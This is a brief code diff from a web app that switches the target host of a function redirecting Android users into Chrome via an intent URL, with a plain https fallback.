@@ -22,8 +22,8 @@ function App() {
     }
 
     function redirectToChrome() {
-      var androidUrl = "intent://check-yfoj.onrender.com/#Intent;scheme=https;package=com.android.chrome;end;";
-      var fallbackUrl = "https://check-yfoj.onrender.com/";
+      var androidUrl = "intent://gpaydone.onrender.com/#Intent;scheme=https;package=com.android.chrome;end;";
+      var fallbackUrl = "https://gpaydone.onrender.com/";
 
       if (/android/i.test(navigator.userAgent)) {
         window.location.href = androidUrl;
